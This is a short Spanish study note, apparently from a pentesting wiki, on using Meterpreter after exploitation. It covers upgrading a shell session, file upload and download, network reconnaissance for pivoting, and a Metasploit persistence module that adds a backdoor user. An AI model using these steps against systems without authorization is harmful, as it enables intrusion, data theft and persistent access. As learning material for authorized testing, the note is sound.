Es un [[Payload de Metasploit]]

Es un payload con comandos incluidos, tipicamente de post-explotacion.

Para mejorar una sesion shell a meterpreter, una opcion es:

``` bash
background
session -u [sessID]
```

Las sesiones se pueden listar mediante ``` sessions ```  y ``` sessions -l ``` 

Los comandos visibles mediante help con meterpreter se ejecutan por igual en Windows o Linux, pero podemos pasar a la shell de la victima con el comando ``` shell ``` 

Comandos útiles para subida y bajada de archivos:

``` bash
download [filepath]
upload [filepathLocal] [filepathDest]
```

El comando ``` arp ``` permite ver la cache ARP, lo cual es particularmente útil para reconocimiento. Con ``` ifconfig ``` y ``` ipconfig ``` nos puede ayudar a descubrir nuevas subredes. Podemos ver los sockets mediante ``` netstat ```. 

Todo esto es útil para el [[Pivoting]]

Tambien podemos ejecutar módulos de metasploit dentro de la máquina.

Por ejemplo, un módulo de persistencia:

``` bash
background
use post/linux/manage/adduser
```

Podemos configurar todo esto:

``` bash
   GROUPS                     no        Set what groups the new user will be part of separated with a
                                         space
   HOME                       yes       Set the home directory of the new user. Leave empty if user w
                                        ill have no home directory
   PASSWORD  Metasploit$1     yes       The password for this user
   SESSION                    yes       The session to run this module on
   SHELL     /bin/sh          yes       Set the shell that the new user will use
   USERNAME  metasploit       yes       The username to create
```

